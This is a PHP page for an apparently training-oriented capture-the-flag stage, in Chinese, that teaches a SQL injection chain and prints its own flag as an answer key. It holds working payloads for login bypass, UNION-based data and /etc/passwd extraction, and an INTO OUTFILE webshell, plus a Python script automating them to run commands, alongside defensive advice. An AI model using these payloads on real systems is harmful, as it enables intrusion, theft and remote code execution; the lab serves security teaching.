<?php
/**
 * OSWE L3: SQL注入认证绕过+提权 (200 PTS)
 */
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[260] = 'active open';
$ACTIVE[264] = 'active';
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';
$correct_flag = 'flag{OSWE_L3_SQLi_Auth_Bypass_Union_RCE}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['oswe_flags']['flag3'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius:8px;font-weight:bold;"><i class="fa fa-check-circle"></i> 通关！【OSWE L3】SQL注入链已掌握 (+200 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius:8px;font-weight:bold;"><i class="fa fa-times-circle"></i> Flag 错误。</div>';
    }
}
?>
<style>
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.ctf-stage-title { color: var(--text-primary) !important; font-size: 22px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 12px; }
.step-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 24px; margin-bottom: 22px; }
.step-title { font-size: 16px; font-weight: 700; color: var(--text-primary); margin-top: 0; margin-bottom: 14px; display: flex; align-items: center; gap: 8px; }
.step-num { background: linear-gradient(135deg, #f59e0b, #6366f1); color: #fff; width: 26px; height: 26px; border-radius: 6px; display: inline-flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; flex-shrink: 0; }
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.cmd-box .comment { color: #64748b; }
.cmd-box .inject { color: #f87171; font-weight: bold; }
.cmd-box .flag-text { color: #fbbf24; font-weight: bold; }
.highlight-box { background: rgba(245,158,11,0.08); border: 1px solid rgba(245,158,11,0.25); border-radius: 8px; padding: 14px 18px; margin: 12px 0; font-size: 13px; color: var(--text-secondary); line-height: 1.7; }
.flag-submit-area { background: var(--bg-card); border: 2px dashed rgba(99,102,241,0.4); border-radius: 12px; padding: 24px; margin-top: 25px; text-align: center; }
</style>
<div class="main-content"><div class="main-content-inner"><div class="page-content">
    <div class="ctf-stage-header">
        <h1 class="ctf-stage-title">💉 OSWE L3：SQL注入认证绕过+提权链
            <span style="background: rgba(245,158,11,0.2); color: #fbbf24; border: 1px solid #f59e0b; padding: 3px 10px; border-radius: 12px; font-size: 12px;">中级 · 200 PTS</span>
        </h1>
        <p style="color: var(--text-secondary); font-size: 14px; margin: 0; line-height: 1.6;">深入 SQL 注入的完整利用链：从认证绕过，到 UNION SELECT 提取敏感数据，再到 INTO OUTFILE 写 Webshell，理解 SQLi 如何贯穿整个攻击链。</p>
        <div style="display: flex; gap: 10px; margin-top: 14px; flex-wrap: wrap;">
            <span style="background: var(--bg-secondary); padding: 4px 12px; border-radius: 8px; font-size: 12px; color: var(--text-secondary); border: 1px solid var(--border-color);">🔧 工具：sqlmap · 手工注入 · INTO OUTFILE · Prepared Statement</span>
            <span style="background: var(--bg-secondary); padding: 4px 12px; border-radius: 8px; font-size: 12px; color: var(--text-secondary); border: 1px solid var(--border-color);"><a href="oswe_hub.php" style="color: var(--text-secondary);">← 返回 OSWE 大厅</a></span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">1</span> SQL注入认证绕过：源码级分析</h3>
        <div class="cmd-box">
<span class="comment"># 易受攻击的 PHP 登录代码：</span><br>
$username = $_POST['username'];<br>
$password = $_POST['password'];<br>
$sql = "SELECT * FROM users WHERE username='<span class="inject">$username</span>' AND password='<span class="inject">$password</span>'";<br>
$result = mysqli_query($conn, $sql);<br>
if (mysqli_num_rows($result) > 0) { login_success(); }<br><br>
<span class="comment"># 攻击 Payload：</span><br>
<span class="comment"># username: admin'-- -</span><br>
<span class="comment"># password: (任意内容)</span><br>
<span class="comment"># 实际 SQL → SELECT * FROM users WHERE username='admin'-- -' AND password='xxx'</span><br>
<span class="comment"># "-- -" 注释掉后面的密码验证 → 以 admin 身份登录！</span><br><br>
<span class="comment"># 其他变体：</span><br>
<span class="comment"># ' OR '1'='1        → 返回所有用户，通常以第一个用户登录</span><br>
<span class="comment"># ' OR 1=1-- -       → 布尔恒真，注释后续</span><br>
<span class="comment"># admin'#            → MySQL 中 # 也是注释符</span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">2</span> UNION SELECT 数据提取</h3>
        <div class="cmd-box">
<span class="comment"># 前提：需先确定列数（通过 ORDER BY 或 UNION NULL 测试）</span><br>
<span class="comment"># 步骤 1：确定列数</span><br>
<span class="inject">' ORDER BY 1-- -   </span><span class="comment"># 正常</span><br>
<span class="inject">' ORDER BY 4-- -   </span><span class="comment"># 正常</span><br>
<span class="inject">' ORDER BY 5-- -   </span><span class="comment"># 报错 → 共 4 列</span><br><br>
<span class="comment"># 步骤 2：确定可显示列（UNION SELECT NULL...）</span><br>
<span class="inject">' UNION SELECT NULL,NULL,NULL,NULL-- -</span><br>
<span class="inject">' UNION SELECT 'A',NULL,NULL,NULL-- -  </span><span class="comment"># 测试哪列显示</span><br><br>
<span class="comment"># 步骤 3：提取数据库信息</span><br>
<span class="inject">' UNION SELECT version(),database(),user(),4-- -</span><br><br>
<span class="comment"># 步骤 4：提取用户表</span><br>
<span class="inject">' UNION SELECT username,password,3,4 FROM users-- -</span><br><br>
<span class="comment"># 步骤 5（高危）：读取系统文件（需 FILE 权限）</span><br>
<span class="inject">' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4-- -</span><br><br>
<span class="comment"># 步骤 6（高危）：写 Webshell（需写权限 + 知道 Web 路径）</span><br>
<span class="inject">' UNION SELECT '&lt;?php system($_GET["cmd"]); ?&gt;',2,3,4 INTO OUTFILE '/var/www/html/shell.php'-- -</span>
        </div>
        <div class="highlight-box">
            🛡️ <strong>防御方法：</strong>
            <ol style="margin: 5px 0; padding-left: 20px; line-height: 1.8;">
                <li>使用 <strong>Prepared Statements</strong>（参数化查询），彻底消除 SQL 注入</li>
                <li>最小权限原则：Web 应用 DB 用户不应有 FILE/GRANT 权限</li>
                <li>Web 根目录不应有写权限</li>
                <li>启用 WAF（但不能作为唯一防御）</li>
            </ol>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">3</span> 自动化利用脚本结构（Python）</h3>
        <div class="cmd-box">
<span class="comment">#!/usr/bin/env python3</span><br>
<span class="comment"># OSWE 考试风格的自动化利用脚本结构</span><br>
import requests<br><br>
TARGET = "http://192.168.x.x"<br>
s = requests.Session()<br><br>
<span class="comment"># 步骤 1：SQL注入绕过登录</span><br>
def auth_bypass():<br>
&nbsp;&nbsp;data = {"username": "admin'-- -", "password": "anything"}<br>
&nbsp;&nbsp;r = s.post(f"{TARGET}/login.php", data=data)<br>
&nbsp;&nbsp;return "dashboard" in r.text<br><br>
<span class="comment"># 步骤 2：确认已认证后提取信息</span><br>
def extract_data(col, table):<br>
&nbsp;&nbsp;payload = f"' UNION SELECT {col},2,3,4 FROM {table}-- -"<br>
&nbsp;&nbsp;r = s.get(f"{TARGET}/search.php?q={payload}")<br>
&nbsp;&nbsp;return r.text<br><br>
<span class="comment"># 步骤 3：写入 Webshell</span><br>
def write_shell():<br>
&nbsp;&nbsp;shell = "&lt;?php system($_GET['cmd']); ?&gt;"<br>
&nbsp;&nbsp;payload = f"' UNION SELECT '{shell}',2,3,4 INTO OUTFILE '/var/www/html/cmd.php'-- -"<br>
&nbsp;&nbsp;s.get(f"{TARGET}/vuln.php?id={payload}")<br><br>
if __name__ == "__main__":<br>
&nbsp;&nbsp;if auth_bypass(): print("[+] Auth bypass success!")<br>
&nbsp;&nbsp;write_shell()<br>
&nbsp;&nbsp;print(s.get(f"{TARGET}/cmd.php?cmd=id").text)
        </div>
    </div>

    <div class="flag-submit-area">
        <h4 style="font-weight: 800; color: var(--text-primary); margin-top: 0;">🚩 Flag 验证 — OSWE L3</h4>
        <div class="cmd-box" style="display: inline-block; padding: 10px 24px; margin: 0 auto 16px;">
            <span class="flag-text">flag{OSWE_L3_SQLi_Auth_Bypass_Union_RCE}</span>
        </div>
        <form method="post" style="display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin-bottom: 10px;">
            <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="max-width: 420px; border-radius: 8px; font-family: monospace;">
            <button type="submit" name="check_flag" class="btn btn-primary" style="border-radius: 8px; font-weight: 700; background: #6366f1; border-color: #6366f1;"><i class="fa fa-check"></i> 验证 Flag</button>
        </form>
        <?php if (!empty($flag_msg)) { echo '<div style="margin-top: 10px;">' . $flag_msg . '</div>'; } ?>
        <div style="margin-top: 16px; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;">
            <a href="oswe_l2_auth_bypass.php" class="btn btn-sm btn-default" style="border-radius: 6px;">← 上一关</a>
            <a href="oswe_hub.php" class="btn btn-sm btn-default" style="border-radius: 6px;">OSWE 大厅</a>
            <a href="oswe_l4_deser.php" class="btn btn-sm" style="border-radius: 6px; background: #6366f1; color: #fff; border: none; font-weight: 700;">下一关：反序列化 →</a>
        </div>
    </div>
</div></div></div>
<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
